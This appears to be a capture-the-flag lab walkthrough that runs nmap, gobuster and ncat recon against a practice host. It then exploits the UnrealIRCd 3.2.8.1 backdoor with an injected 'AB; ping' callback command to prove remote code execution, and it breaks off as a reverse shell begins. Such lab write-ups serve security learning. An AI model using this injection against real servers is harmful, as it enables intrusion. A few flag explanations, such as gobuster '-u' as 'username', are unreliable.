# First, let's run our nmap scan.

nmap -sC -sV -oA nmap/help 10.10.10.117

# After the scan has completed view the findings

# Open Ports:

22 - OpenSSH 6.7p1 Debian
80 - Apache httpd 2.4.10
111 - rpcbind 2-4

# Browse to 10.10.10.117 and lets see what is on port 80
# You get an image and a hint about RPC

# Let's check out that RPC thing some more by running a deeper NMAP scan on it

nmap -vvv- -p- 10.10.10.117

# This will increase the verbosity on open ports.
# Try the following on the webpage
/robots.txt
~root

# Lets run gobuster on the website.
# Gobuster is a tool for brute forcing URIs (Files and Directories) and DNS subdomains.
# https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/

gobuster -u http://10.10.10.117 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o root.log

-u = username
-w = wordlists
-0 = output file

# While gobustster is running try some different index formats on the page (e.g., index.php, index.html, index.aspx)

# A /manual page was found. Browse to"

10.10.10.117/manual

# Just the Apache docs but the Copyright at the bottom reveal the date and version.

# Port 8067 was revealed as open from the verbose NMAP scan, lets scan it.

nmap -sC -sV -p 8067 10.10.10.117

# Revealed as open and running UnrealIRCd

# Lets run Netcat on that port

ncat 10.10.10.117 8067

# irked.htb Hostname is revealed, lets add the hostname to our hosts file on our box

# nano or vi

# Open firefox and browse to irked.htb to check for virtual hosts routing

# Lets Google how to use IRC (RFC IRC) https://tools.ietf.org/html/rfc2812

# Now lets use NetCat to talk to the IRC Server

# And now you are talking with the IRC Server
# The version of the Unreal IRC server is given: Unreal3.2.8.1
# Google a release date
# Lets search for an exploit

searchsploit unreal

# A backdoor exploit is revealed using metasploit but lets learn how to do it without metasploit
# Google unrealirc backdoor (https://lwn.net/Articles/392201/)

# How the backdoor works

# The backdoor was disguised to look like a debug statement in the code:

    #ifdef DEBUGMODE3
	   if (!memcmp(readbuf, DEBUGMODE3_INFO, 2))
	       DEBUG3_LOG(readbuf);
    #endif


# Open a new terminal pane and run:

tcpdump -i tun0 icmp

# -i = capture from the desired interface

# Open a new terminal pane and run:

echo "AB; ping -c 1 YOU.RHO.ST.IP" | ncat 10.10.10.117 8067

# After it times out it is revealed that the IRC Server initiates a session with your host, giving you command execution.
# Now lets get a reverse shell

# Switch back to the other terminal pane and run:
